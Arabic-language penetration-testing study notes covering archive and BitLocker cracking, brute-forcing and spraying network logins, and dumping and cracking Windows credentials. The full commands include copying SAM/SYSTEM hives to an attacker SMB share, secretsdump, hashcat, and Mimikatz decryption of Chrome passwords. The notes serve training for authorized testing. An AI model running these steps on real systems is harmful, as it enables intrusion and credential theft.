    2. الخوارزمية اللي اتبعت لتحويل الباسورد لمفتاح (KDF): لو KDF بطيء/مُكثف (مثل bcrypt, PBKDF2 مع iterations عالية, أو Argon2) هتبقى العملية أصعب جداً.
        
    3. وجود salt أو معايير إضافية.
        
- ملفات Office الحديث (Office 2013+) وPDF مع إعدادات قوية بيستخدموا key derivation قوي — صعب تُكسر في وقت معقول لو الباسورد كويس.
    

---

# Layer 7
## 1️⃣ ليه نستخدم archives؟

- لما يبقى عندك ملفات كتيرة (Excel, PDF, Word, PPT) وعايز تبعتها أو تخزنها بشكل مرتب، بدل ما تبعت كل ملف لوحده أو تضيع حاجات، بنعمل **archive**.
    
- archive = ملف مضغوط (compressed file) ممكن يكون ZIP, RAR, 7z, TAR… الخ.
    
- في شركات كبيرة، archives مهمة لتنظيم الملفات في مجلدات فرعية قبل الضغط.
    

---

## 2️⃣ أنواع الملفات المضغوطة/archive

- `.zip, .rar, .7z, .tar, .gz, .gzip, .vmdb, .vmx, .cpt, .truecrypt, .bitlocker, .kdbx, .deb`
    
- في موقع FileInfo في حوالي 365 نوع من الملفات المضغوطة.
    
- مش كل الملفات دي تدعم حماية بالباسورد بشكل أصلي، زي TAR، في العادة بنستخدم openssl أو gpg لتشفيرها.
    
- أمر للبحث عن امتدادات archive:
    

`curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt`

---

## 3️⃣ كسر ZIP المحمية

- ZIP شائعة جدًا على Windows. لو محمية بالباسورد، نستخدم **zip2john** لاستخراج الـhash وبعدين نكسرها باستخدام John أو Hashcat.
    

![[Pasted image 20251110170812.png]]


---

## 4️⃣ كسر ملفات GZIP المشفرة بـOpenSSL

- أحيانًا ملفات GZIP مشفرة باستخدام openssl، مش كل امتداد يظهر إنه محمي بالباسورد.
    
- نعرف النوع بالـcommand:
    

![[Pasted image 20251110170852.png]]


- الطريقة: نعمل for loop على كلمة السر اللي معانا (مثل rockyou.txt) ونحاول نفك التشفير:
    

```
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz done
```



- لو الباسورد صح، هيتم استخراج الملفات. الرسائل زي "not in gzip format" ممكن تتجاهل.
    

---

## 5️⃣ كسر BitLocker-encrypted drives

- BitLocker = full-disk encryption 
- من مايكروسوفت. يستخدم AES-128 أو 256.
    
- لو نسي الشخص الباسورد، ممكن يستخدم recovery key (48-digit).
    
- في labs أو pentesting، نركز على كسر **password** مش recovery key لأنه طويل جدًا.
    

**مثال عملية:**

![[Pasted image 20251110171059.png]]

![[Pasted image 20251110171142.png]]

- بعد كراك، الباسورد يطلع مثلاً: `1234qwer`.
    

---

### 6️ Mount BitLocker drives

- على **Windows**: double-click على `.vhd` → يظهر لك prompt → تدخل password → تفتح drive.
    ![[Pasted image 20251110171219.png]]
    
- على **Linux/macOS**:
    

`sudo apt-get install dislocker sudo mkdir -p /media/bitlocker /media/bitlockermount sudo losetup -f -P Backup.vhd sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount cd /media/bitlockermount ls -la`

- بعد ما تخلص:
    

`sudo umount /media/bitlockermount sudo umount /media/bitlocker`

---

## 7️⃣ ملاحظات هامة

- archives زي ZIP وRAR ممكن تتكسر بسهولة لو الباسورد ضعيف.
    
- OpenSSL / BitLocker صعبة، ممكن تحتاج hardware قوي أو وقت طويل.
    
- TAR أصلي بدون تشفير → لازم openssl/gpg علشان نحميه.
    
- كل الملفات اللي مش Native password-protected → لازم نعرف الطريقة المستخدمة قبل ما نحاول كسرها.

# Layer 8

---

## الفكرة العامة — إيه المقصود بـ Network Services؟

كل شبكة حتلاقي عليها خدمات (services) شغالة على سيرفرات أو محطات عمل علشان تنفذ وظائف: ويب، ملفات، بريد، ربط عن بعد، قواعد بيانات... أمثلة شائعة: **FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP**.  
في اختبار اختراق بنقّص إننا بنحاول نلاقي خدمات قابلة للاستغلال أو للدخول بكريدنشال ضعيفة.

---

## إدارة ويندوز عن بعد — RDP / WinRM / SSH

لو عايز تدير Windows عن بعد، الخدمات اللي غالبًا هنشتغل عليها:

- **RDP** (واجهة رسومية، port 3389)
    
- **WinRM** (Windows Remote Management — 
- برتوكول مبني على SOAP وXML، بيسمح بالـremote PowerShell، بيفتح عادة على 5985 HTTP و5986 HTTPS)
    
- **SSH** (أكتر شائع على لينوكس؛ على ويندوز ممكن يكون مثبت لكن أقل شيوعاً)
    

### WinRM - نقاط مهمة

- مش شغّال افتراضي على كل Windows؛ لازم يتفعل ويتظبط.
    
- في الـAD/domains الناس بتستخدم شهادات أو آليات authentication خاصة لزيادـة الأمان.
    
- لو شغال على الـhost تقدر تباصطله remote commands أو PowerShell Remoting.
    
- مفيد جدًا لاختراق lateral movement لو لقيت credentials.
    

---

## NetExec — أداة لطيفة لاختبار المصادقة على بروتوكولات كتير

- أداة واحدة بتدعم بروتوكولات مختلفة: `nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc`
    
- تركيب سهل: `sudo apt-get -y install netexec` أو clone من GitHub.
    
- شكل الأمر العام:
    

```
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

- مثال WinRM:
    

```
netexec winrm 10.129.42.197 -u user.list -p password.list
```

لو لقى credential بيطبع سطر زي: `None\user:password (Pwn3d!)` — ده معناه غالبًا تقدر تشغّل أوامر بعد الدخول.

> NetExec فيه خيارات متطورة: threads, timeout, jitter, logging, خيارات لكل بروتوكول (shares, exec methods, etc). اقرا الـhelp كويس قبل ما تشغّل.

---

## Evil-WinRM — تيرمنال PowerShell بعيد لبنية ويندوز

- أداة مكتوبة روبي، مفيدة جدًا للتعامل بعد ما تلاقي credential على WinRM.
    
- تثبيت:
    

```
sudo gem install evil-winrm
```

- تشغيل:
    

```
evil-winrm -i <IP> -u <username> -p <password>
```

- هتفتح لك shell على شكل `*Evil-WinRM* PS C:\Users\user\Documents>` تقدر تنفّذ أوامر PowerShell وتجيب ملفات وتعمل upload/download.
    

---

## SSH — شرح مختصر

- SSH برتوكول قوي للـremote shell وfile transfer (sftp, scp).
    
- يستخدم: symmetric encryption (بعد key exchange)، asymmetric (public/private keys)، hashing للتأكد من الرسائل.
    
- لو حصل private key مش محمي بـpassphrase — أي حد معه يقدر يدخل مباشرة.
    

### Brute-force على SSH

- أداة معروفة: **Hydra**
    

```
hydra -L user.list -P password.list ssh://10.129.42.197
```

- ملاحظة: SSH servers عادةً بيحدّوا عدد المحاولات المتواصلة، فاستعمل `-t` لتقليل الـthreads أو تضيف delays.
    

---

## RDP — Remote Desktop Protocol

- يشتغل عالعادة على port 3389. بيدي واجهة رسومية (GUI).
    
- أدوات للاتصال من Linux: **xfreerdp**, **Remmina**.
    
- مثال فتح session عبر xfreerdp:
    

```
xfreerdp /v:10.129.42.197 /u:user /p:password
```

- زي SSH، ممكن نعمل brute-force بـHydra (مع حذر لأن RDP ما بيحبش parallel connections).
    

---

## SMB — مشاركة ملفات ويندوز

- SMB (Server Message Block) بيخلّي الأجهزة تشارك ملفات ومجلدات وطابعات.

مشهور بـ CIFS 
- في شبكات ويندوز، تلاقي shares زي `C$`, `ADMIN$`, وshares مخصصة.
    
- لو عندك credential صالح ممكن تستعرض الملفات أو تنقل أو ترفع.
    

### اكتشاف وإفادة

- بعد ما تلاقي credential من Hydra أو msf أو netexec، تقدر تجيب لستة الـshares:
    

```
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

- أو بالجيتول klasik: **smbclient**
    

```
smbclient -U user \\10.129.42.197\SHARENAME
# بعديها تدخل الباسورد وتبقى في interactive shell
smb: \> ls
smb: \> get filename
smb: \> put localfile
```

---

## Hydra — موجز وقواعد استخدام

- أداة for credential stuffing / bruteforce على بروتوكولات كتير: ssh, rdp, smb, ftp, http, smtp...
    
- أمثلة:
    

```
hydra -L user.list -P password.list ssh://10.129.42.197 -t 4
hydra -L user.list -P password.list rdp://10.129.42.197 -t 4 -W 1
hydra -L user.list -P password.list smb://10.129.42.197 -t 1
```

- نصايح:
    
    - قلّل الـthreads للبروتوكولات الحساسة (RDP, SMB).
        
    - استعمل delays/jitter عشان تقلل الـlockouts.
        
    - تابع الـservice logs عشان ماتسببش account lockouts غير مقصودة.
        



---

## مشاكل Hydra مع SMBv3 — الحل: Metasploit أو تحديث Hydra

- نسخ قديمة من Hydra ممكن ماتفهمش SMBv3 فتطلع `invalid reply`.
    
- حلّين: تعيد compile أحدث نسخة من Hydra، أو تستخدم **Metasploit** module `auxiliary/scanner/smb/smb_login` الّلي يدعم أكتر.
    

### مثال Metasploit

```
msfconsole
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

- Metasploit هيرجعلك credentials أو يوري إن في نجاح.
    

---

## workflow عملي شائع في اختبار اختراق شبكات Windows

1. **البحث عن خدمات مفتوحة** (nmap) → شوف ports: 22, 3389, 445, 5985/5986, 1433...
    
2. **تجميع users/passwords** من OSINT أو dumps أو wordlists.
    
3. **جرب brute-force أو credential stuffing** بـHydra/NetExec/Metasploit.
    
4. **لو نجحت**:
    
    - على WinRM: افتح Evil-WinRM.
        
    - على RDP: افتح xfreerdp / Remmina.
        
    - على SSH: ssh user@ip أو استخدم المفتاح.
        
    - على SMB: smbclient for shares, mount.cifs لو عايز تمونت.
        
5. **استغل الصلاحيات** للحصول على ملفات حساسة، escalate privileges، lateral movement.
    

---

## أخطاء شائعة وتحذيرات

- **Account lockout**: خلي بالك من سياسات الAD؛ brute-force ممكن يسبب lockout ويهرّب فرصك.
    
- **Parallel connections**: 
- بعض الخدمات (RDP, SMB) بتحسّس وتقطع لو ضغطت عليها parallel كتير. استخدم `-t` مناسب.
    
- **قوانين وأخلاق**: كلها تجارب تعليمية أو pentest مرخّص؛ متحاولش على أنظمة مش بتاعتك.
    
- **Logging & Detection**: عمليات brute force بتسيب آثار في logs؛ لو في IDS/EDR هتتلك.





---

## نصايح عملية صغيرة هتسهل عليك

- استخدم **NetExec** بداية لأنه يدعم بروتوكولات كتير في نفس واجهة والأوتوماتيك بتاعه يساعد.
    
- دايمًا جرب **combinations**: userlist × passwordlist، ولو عندك كلمات مشتقة (Mark+Nexura+1998) حطهم في wordlist خاص.
    
- بعد ما تدخل بنجاح، استخدم أدوات مريحة: Evil-WinRM لـWinRM، smbclient أو mount.cifs لـSMB، xfreerdp لـRDP.
    
- لو Hydra مش شغال مع SMBv3 استعمل Metasploit أو حدّث Hydra من المصدر.
    

---

# Layer 9

---

##  أول حاجة: يعني إيه Spraying, Stuffing, و Default Credentials؟

التلاتة دول أنواع مختلفة من **الهجمات على كلمات السر**، بس كل واحدة ليها **أسلوب وطريقة تفكير مختلفة**:

---

### 🔹 1. Password Spraying Attack

 **الفكرة:**  
بدل ما تجرّب _كلمة سر كتير على حساب واحد_ (وده ممكن يعمل lock)، انت بتجرّب _كلمة سر واحدة على كل الحسابات_.

🎯 **الهدف:**  
تكتشف لو في يوزر واحد على الأقل لسه بيستخدم الباسورد دي (زي ChangeMe123! أو Welcome1 مثلاً).

📘 **مثال:**  
لو عندك 100 موظف، بدل ما تجرّب ألف باسورد لكل واحد،  
هتجرب باسورد واحدة (زي `ChangeMe123!`) على كل الـ100 يوزر مرة واحدة.

📟 **كده في الكود:**

```bash
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
```

- `smb`: البروتوكول اللي بنستهدفه (خدمة الملفات في ويندوز).
    
- `10.100.38.0/24`: الرينج اللي بتجرب عليه الأجهزة كلها.
    
- `-u usernames.list`: لستة اليوزرز.
    
- `-p 'ChangeMe123!'`: كلمة السر اللي هتجربها لكل يوزر.
    

_لو واحدة من الحسابات لسه بالباسورد دي → bingo! حصل اختراق._

B@tm@n2022!

---

### 🔹 2. Credential Stuffing Attack

🧩 **الفكرة:**  
الهاكر بيستغل fact إن أغلب الناس بتستخدم **نفس الإيميل والباسورد في كل حتة**.

🎯 **الهدف:**  
لو عندك قاعدة بيانات مسرّبة من موقع (زي Netflix leak أو LinkedIn breach)، ممكن تستخدمها لتجرب الدخول على أنظمة تانية (زي SSH، RDP...).

📟 **الكود:**

```bash
hydra -C user_pass.list ssh://10.100.38.23
```

- `-C user_pass.list` →
- ملف فيه username:password في كل سطر (زي: `mark:white123!`).
    
- `ssh://10.100.38.23` → البروتوكول والسيرفر اللي بتجرب عليه.
    

💡 _ده اسمه credential stuffing لأنك "بتحشي" نفس الكريدنشالز المسروقة في خدمات مختلفة._

---

### 🔹 3. Default Credentials Attack

🧩 **الفكرة:**  
أنظمة كتير (راوترات، ديفايسات، قواعد بيانات...) بتيجي من المصنع بباسورد افتراضية زي:

```
Username: admin
Password: admin
```

🎯 **الهدف:**  
تشوف هل الأدمن سابها زي ما هي؟ لو آه… فده اختراق مجاني تقريبًا 😂

📦 **الطريقة:**

- في أدوات بتحتوي على قواعد بيانات بالباسوردات الافتراضية، زي:
    

```bash
pip3 install defaultcreds-cheat-sheet
```

بعد التثبيت:

```bash
creds search linksys
```

هيطبعلك جدول بكل الديفولت باسوردات اللي ليها علاقة بـ Linksys مثلًا 👇

```
| linksys | admin | admin |
| linksys | root  | orion99 |
| linksys (ssh) | admin | password |
```

---

### 💡 مثال عملي من الحياة الواقعية:

لو أنت بتعمل اختبار اختراق في شركة لقيت عندهم أجهزة راوتر **D-Link**:

- تدخل الموقع: `http://192.168.0.1`
    
- تجرب:
    
    ```
    username: admin
    password: Admin
    ```
    

لو اشتغلت → بقى عندك access على الراوتر 😅

---

##  ملاحظات مهمة:

1. **Password Spraying** بيفيدك جدًا ضد Active Directory عشان مايتقفلش الحساب بسرعة.  
    (تجرب كلمة واحدة بس على كل حساب، تستنى شوية، وتعيد بكلمة تانية.)
    
2. **Credential Stuffing** بيعتمد على leaks، فدائمًا استخدم بيانات مسرّبة حديثة أو مخصصة للدومين.
    
3. **Default Credentials** بتنفع خصوصًا في أجهزة الشبكة أو تطبيقات الـadmin panel.
    


---

# Layer 10

---

## الفكرة الكبيرة بسرعة

لما حد يدخل ويندوز (لوكال أو دومين) بتحصل سلسلة تعاملات بين واجهة الدخول والـLSA  
The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`)
والـauthentication packages. النتيجة: النظام يقرر مين أنت ويديلك توكن وصلاحيات. المعلومات الحسّاسة (password hashes، tickets، saved creds) بتتخزن في أماكن مختلفة: **SAM** للحسابات المحلية،
**NTDS.dit**
للدومين، **LSASS** أثناء التشغيل، و**Credential Manager** لحاجات المستخدم المُحفوظة.

---

## خطوة بخطوة — الـLogin Flow مبسّط

1. المستخدم يكتب يوزر/باسورد على شاشة الدخول.
    
2. **WinLogon** (السيستم بروسيس) يطلق **LogonUI** — ده اللي بيعرض الفورم ويستقبل الإدخالات.
    
3. الـ credentials بتيجي من **Credential Provider** (COM object — أي نوع من الطرق: keyboard, PIN, smartcard, fingerprint).
    
4. WinLogon يبعت الـcredentials لـ**LSASS** (Local Security Authority Subsystem Service) عن طريق واجهة LSA.
    
5. **LSASS** يقرّر أي authentication package يتعامل مع الطلب — ممكن يكون **Msv1_0** (local NTLM), أو **Kerberos** لو الجهاز في دومين، إلخ.
    
6. لو الجهاز عضو دومين: LSASS يتواصل مع **Domain Controller** علشان يتحقق من الـcredentials (ويُرجع Ticket في حالة Kerberos). لو مش دومين: LSASS يقارن مع **SAM** المحلي.
    
7. لو auth نجحت، السيرفس يولّد **access token** للمستخدم ويفتح الـsession.
    
![[Pasted image 20251112161140.png]]

---

## المكوّنات الأساسية وفاهم إيه دورهم

### WinLogon / LogonUI

- المسئول عن واجهة الدخول والـlock/unlock.
    
- هو الوحيد اللي بيستقبل مباشرة مدخلات الكيبورد في شاشة الدخول (trusted process).
    

### Credential Providers

- دي الـplugins اللي بتسمح بأنواع مختلفة من طرق المصادقة (password, PIN, smartcard, fingerprint).
    
- بتكتبها كـDLL/COM objects — ممكن تكون custom.
    

### LSASS (lsass.exe)

- هو الـ“gatekeeper”. بيتعامل مع الauthentication packages، يطبق سياسات الـsecurity، ويطلع أحداث الأمن للـEvent Log.
    
- أي شيء يتعلق بالتحقق من هوية المستخدم بيعدّي من هنا.
    

### Authentication packages (DLLs)

- أمثلة: `Msv1_0.dll` (NTLM local), `Kerberos.dll`, `Netlogon.dll`.
    
- اللي بيختار البروتوكول المناسب هو `Lsasrv.dll` (Negotiate function يقرّر لو Kerberos أو NTLM هيشتغل).
    

---

## فين بتتخزن الـcredentials؟

### SAM (Security Account Manager)

- مكان تخزين حسابات **المكينة المحلية** (local users).
    
- ملف فعلي: `%SystemRoot%\system32\config\SAM` ومربوط في الريجستري تحت `HKLM\SAM`.
    
- يخزن الـpasswords كـ**hashes** (عادة NTLM, LM legacy).
    
- طلعته أو الوصول ليه محتاج **SYSTEM** privileges — عشان كده مش أي يوزر عادي يقدَر يقراله.
    

### NTDS.dit (Active Directory)

- ملف قاعدة البيانات للدومين على الـDomain Controller.
    
- فيه كل بيانات الدومين: user objects، group objects، وهاشات كلمات السر للدومين.
    
- الوصول ليه ويتطلب صلاحيات على الـDC أو snapshot من vss أو نسخ الملفات من نظام مُشغّل على DC.
    

### LSASS memory

- أثناء التشغيل، LSASS بيخزن بيانات حسّاسة في الذاكرة: تذاكر Kerberos (TGT/TGS), session keys, cleartext passwords sometimes (في حالات معينه)، NTLM hashes.
    
- أدوات زي **Mimikatz** بتقدر تقرأ ذاكرة LSASS وتستخرج credentials/Tickets — لكن الوصول للذاكرة دي يحتاج صلاحية SYSTEM أو debug privileges.
    

### Credential Manager (Vault)

- مكان لتخزين credentials اللي المستخدم حفظها (site passwords, network creds, generic credentials).
    
- المسار: `%UserProfile%\AppData\Local\Microsoft\Vault\` أو في Windows 10+ تحت `%UserProfile%\AppData\Local\Microsoft\Vault\Credentials\` (وفي نسخ أحدث فيه Credential Locker).
    
- الداتا مش مخزنة كـplain text — بتتشفّر باستخدام مفاتيح متعلقة بالمستخدم والجهاز (DPAPI). بس مع وصول SYSTEM أو مفتاح الـuser أو session ممكن تفكها.
    

---

## البروتوكولات: Kerberos vs NTLM (على السريع)

- **Kerberos**
- : بروتوكول يعتمد على TGT/TGS و tickets؛ آمن وسريع ومُستخدم في الـActive Directory.
    
- **NTLM**: challenge-response
- قديمة، أقل أمانًا، بتستخدم NTLM hashes؛ بتظهر في شبكات غير مُهيّأة لـKerberos أو في fallbacks.
    
- `Negotiate` (lsasrv) بيختار الأفضل بين الاتنين.
    

---

## عمليات واستخراج شائعة في اختبارات الاختراق (مَسموح في سياق تعليمي/مرخّص)


- **Dump LSASS memory** → 
- لاستخراج TGTs/cleartext passwords (يحتاج SYSTEM). أدوات مشهورة: `Mimikatz`, `procdump`+`sekurlsa::minidump`.
    
- **Extract SAM** (off-line) → لو عندك صورة للقرص أو قدرت تعمل Volume Shadow Copy، تقدر تستخرج SAM وتحاول كراك الهاشات offline.
    
- **Dump NTDS.dit** → على DC، استخدم `ntdsutil`, `ntds.dit` extraction with SYSTEM or VSS snapshot, أو أدوات like `secretsdump.py` (Impacket).
    
- **Credential Manager extraction** → أدوات تفك تشفير DPAPI أو تستخدم مفاتيح المستخدم لاستخراج saved creds.
    
- **Kerberos attacks** → golden ticket / silver ticket / pass-the-ticket (يعتمد على مفاتيح DC / KRBTGT).
    

---

## هجمات شائعة مرتبطة بالتخزين ده (مبسطة)

- **Pass-the-Hash (PtH):** تستخدم NTLM hash بدل الباسورد للدخول بدون كسر الباسورد.
    
- **Pass-the-Ticket (PtT):** استخدام Kerberos ticket مسروق للدخول.
    
- **Golden Ticket:** تزييف TGT لو حصلت على مفتاح `KRBTGT` من الـDC.
    
- **Dump & Crack:** إخراج SAM/NTDS وcrack الهياشات offline (بـhashcat/john).
    
- **Credential harvesting from Vault:** استخدام مفاتيح DPAPI لاستخراج saved creds.
    

---

## خلاصة سريعة عشان تفتكر

- WinLogon ← Credential Providers ← LSASS ← Authentication Package ← SAM / AD.
    
- SAM = محلي، NTDS.dit = دومين، LSASS = الذاكرة اللحظية، Credential Manager = creds محفوظة بالمستخدم.
    
- الوصول للـcredentials غالبًا محتاج صلاحيات عالية (SYSTEM أو حقوق على الـDC).
    
- الأدوات والتقنيات لاستخراج المفاتيح موجودة، لكن الدفاعات زي Credential Guard وMFA بتصعب الحكاية.
    

---

# Layer 11

###  الهدف من الهجوم:

تحصل على **password hashes** (التجزئات) الخاصة بالمستخدمين المحليين (local users) على النظام، وبعد كده تكسرها (crack) باستخدام أدوات زي Hashcat عشان تطلع الباسورد الحقيقي.

---

### 🧩 الملفات (Registry Hives) اللي بنحتاجها:

| Hive         | الموقع                                | الاستخدام                                             |
| ------------ | ------------------------------------- | ----------------------------------------------------- |
| **SAM**      | `C:\Windows\System32\config\SAM`      | فيه الـ password hashes للمستخدمين المحليين.          |
| **SYSTEM**   | `C:\Windows\System32\config\SYSTEM`   | فيه الـ boot key اللي بنستخدمها لفك تشفير الـ SAM.    |
| **SECURITY** | `C:\Windows\System32\config\SECURITY` | فيه بيانات إضافية زي cached credentials و DPAPI keys. |

---

### الخطوات الأساسية:

#### 1. نعمل نسخة من الـ hives باستخدام `reg.exe`

في CMD (كـ Administrator):

```cmd
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
reg save hklm\security C:\security.save
```

كده انت عملت نسخ احتياطية للملفات المهمة اللي فيها الباسوردات.

---

#### 2. ننقل الملفات دي لجهازنا (الـ attacker machine)

نستخدم أداة من Impacket اسمها `smbserver.py` على جهازنا:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/
```

بعدها من جهاز الـ Windows نعمل:

```cmd
move C:\sam.save \\10.10.14.1\CompData
move C:\system.save \\10.10.14.1\CompData
move C:\security.save \\10.10.14.1\CompData
```

(العنوان ده هو IP المهاجم)

![[Pasted image 20251112162734.png]]

---

#### 3. نستخدم أداة `secretsdump.py` من Impacket

ودي بتفك تشفير الـ SAM باستخدام الـ SYSTEM key وتطلعلك الـ hashes.

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

هتشوف نتايج شبه دي:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

الجزء الأخير بعد الـ `:` هو الـ **NT hash** اللي بنستخدمه في الـ cracking.

---

#### 4. نكسر الـ hashes باستخدام Hashcat

نحط الـ hashes في ملف:

```bash
echo "64f12cddaa88057e06a81b54e73b949b" > hashes.txt
```

ثم نشغل Hashcat:

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

📌 المود `-m 1000` = NTLM hashes (اللي هو نوع الـ hash الخاص بويندوز).

---

#### 5. لو لقيت الباسورد؟

مبروك  دلوقتي تقدر:

- تستخدمه لتسجيل الدخول بالـ RDP أو SMB.
    
- أو تجرب تستخدمه على باقي الأجهزة في الشبكة (لأن الناس بتعيد استخدام نفس الباسورد في أكتر من مكان).
    

---

## أول حاجة: يعني إيه DCC2 Hashes؟

لما تكون داخل على **دومين (Domain)** — يعني الجهاز تابع لشبكة شركة — الويندوز بيخزن نسخة “مشفّرة” من الباسورد بتاعك **محليًا** على الجهاز، عشان لو النت فصل أو السيرفر مش متاح، تقدر تسجّل دخول أوفلاين.

النسخة دي اسمها:

> **Domain Cached Credentials (DCC)**  
> والإصدار التاني منها (الأحدث والأقوى) اسمه:  
> **DCC2**

---

## فين بتتخزن؟

في الريجيستري، في المسار:

```
HKLM\SECURITY
```

(يعني تحت مفتاح السيستم اللي بيخزن معلومات الأمان).

---

##  شكل الهاش بيكون عامل كده:

```
$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

وده بيتكوّن من:

- `$DCC2$` → نوع الهاش (Domain Cached Credential v2)
    
- `10240` → عدد مرات التكرار (iteration count)
    
- `administrator` → اسم اليوزر
    
- `23d975...` → الهاش نفسه
    

---

##  التقنية المستخدمة في التشفير:

DCC2 بيستخدم خوارزمية اسمها **PBKDF2**، ودي قوية جدًا لأنها:

- بتكرّر التشفير آلاف المرات (زي 10,240 مرة مثلاً)
    
- فبتبطّئ عملية الكسر جدًا 
    

---

## مقارنة بين DCC2 و NTLM:

|النوع|الخوارزمية|السرعة في الكسر|ينفع Pass-the-Hash؟|
|---|---|---|---|
|NTLM|MD4|سريع جدًا (ممكن ملايين في الثانية)|✅ آه|
|DCC2|PBKDF2|بطيء جدًا (أضعف كتير في السرعة)|❌ لأ|

---

## يعني إيه الكلام ده؟

يعني لو قدرت تسرق DCC2 hash من جهاز ويندوز، **مش هتقدر تستخدمه** علشان تعمل حركة زي "Pass-the-Hash"  
(يعني تدخل على جهاز تاني بنفس الهاش)،  
لكن ممكن تحاول **تكسره (crack)** عشان تطلع الباسورد الأصلي.

---

##  مثال عملي:

الكود اللي انت شايفه في الشرح:

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

ده معناه:

- استخدم **hashcat** أداة الكسر.
    
- `-m 2100` → المود الخاص بـ DCC2.
    
- وبعد شوية كده بيقولك النتيجة:
    

```
...:ihatepasswords
```

يعني قدر يطلّع الباسورد الأصلي هو **ihatepasswords**.

---

## لكن خُد بالك:

السرعة كانت:

```
Speed.#1.........:     5536 H/s
```

بينما الـ NTLM بيتكسر بسرعة:

```
4605.4 kH/s
```

يعني DCC2 أبطأ بحوالي **800 مرة**  
عشان كده بيقولك في الشرح:

> “Strong passwords are often uncrackable”  
> (يعني الباسوردات القوية صعب جدًا تتكسر في وقت معقول).

---

---

##  أولاً: DPAPI يعني إيه؟

DPAPI = **Data Protection API**  
ودي ببساطة عبارة عن نظام جوّه ويندوز مسؤول عن **تشفير وفك تشفير البيانات الحساسة** (زي الباسوردات، التوكنات، الكوكيز...).

---

##  إزاي بيشتغل DPAPI؟

كل يوزر في الويندوز ليه “مفتاح تشفير خاص بيه”  
(اسمه **User Master Key**)  
وبيستخدمه عشان يشفّر بياناته الخاصة زي:

- الباسوردات اللي محفوظة في Chrome أو IE
    
- بيانات الـ Outlook
    
- بيانات الـ RDP (Remote Desktop)
    
- الـ Credential Manager
    

يعني باختصار:

> كل برنامج بيخزّن بيانات حساسة = DPAPI بيشفّرها.

---

##  مثال بسيط:

تخيّل إنك فتحت Chrome ودوّنت باسورد موقع معين،  
كروم هيخزن الباسورد جوّه ملف اسمه:

```
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

لكن الباسورد جوّه مش مكتوب نص صريح (plaintext)،  
ده مشفّر باستخدام DPAPI 

---

## إزاي بنفك التشفير (كمختبر اختراق مثلاً)؟

فيه أدوات زي:

- `mimikatz`
    
- `impacket-dpapi`
    
- `DonPAPI`
    

اللي بتفك تشفير البيانات دي عن طريق استخدام مفاتيح الـ DPAPI بتاعة اليوزر.

---

###  مثال عملي بالأمر اللي في الشرح:

```bash
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

ده معناه:

- شغّل ميميكاتز.
    
- استخرج الباسوردات المشفّرة من ملف كروم.
    
- استخدم API بتاعة الويندوز عشان تفك التشفير.
    

وبيظهر الناتج بالشكل ده:

```
URL     : http://10.10.14.94/login.html
Username: bob
Password: April2025!
```

كده قدر يطلّع الباسورد الحقيقي اللي كان مستخدمه البوب في الكروم.

---

##  DPAPI بيتخزن فين؟

في المسار ده تقريبًا:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\
```

وجوّه المسار ده بتلاقي ملفات فيها الـ Master Key اللي بيستخدمه DPAPI.

---

##  نروح بقى لـ RDP:

RDP = **Remote Desktop Protocol**  
وده اللي بيسمحلك تتحكم في جهاز تاني عن بُعد (زي TeamViewer بس بتاع مايكروسوفت).

لما تسجّل الدخول باستخدام RDP وتعمل:  
 “Save Credentials”

الويندوز بيخزّن اليوزر والباسورد دي **مشفّرين**  
باستخدام… مين؟  
بالظبط  — **DPAPI** برضه.

---

##  يعني ببساطة:

كل البرامج اللي بتعمل “Remember my password” في ويندوز،  
DPAPI هو اللي بيشفر الباسورد ده ويحافظ عليه.  
لكن لو مهاجم قدر ياخد مفاتيح DPAPI، يقدر **يفك كل الباسوردات المحفوظة** في البرامج دي.

---

## ⚔️ أدوات تستخدمها في الهجوم:

|الأداة|الوظيفة|
|---|---|
|mimikatz|استخراج وفك DPAPI من سيستم حي|
|DonPAPI|استخراج DPAPI عن بُعد (network)|
|impacket-dpapi|استخراج المفاتيح وتحليلها يدويًا|

---

##  خلاصة الجزء كله:

|المصطلح|وظيفته|قابل للكسر؟|ممكن نستخدمه للهجوم؟|
|---|---|---|---|
|DCC2 Hash|نسخة مشفّرة من باسورد الدومين محليًا|صعب جدًا (PBKDF2)|❌ لا يمكن Pass-the-Hash|
|DPAPI|نظام تشفير بيانات المستخدم (باسوردات البرامج)|ممكن يتفك لو معاك Master Key|✅ ممكن تستخرج باسوردات فعلية|
|RDP Saved Credentials|بيانات دخول محفوظة باتصال ريموت|مشفّرة بـ DPAPI|✅ ممكن تتفك لو DPAPI اتكسر|

---



#### 🧠 ملاحظات مهمة:

- الـ **boot key** اللي في SYSTEM hive ضروري جدًا عشان تقدر تفك تشفير SAM.
    
- بدون صلاحيات Administrator مش هتقدر تعمل save للـ hives.
    
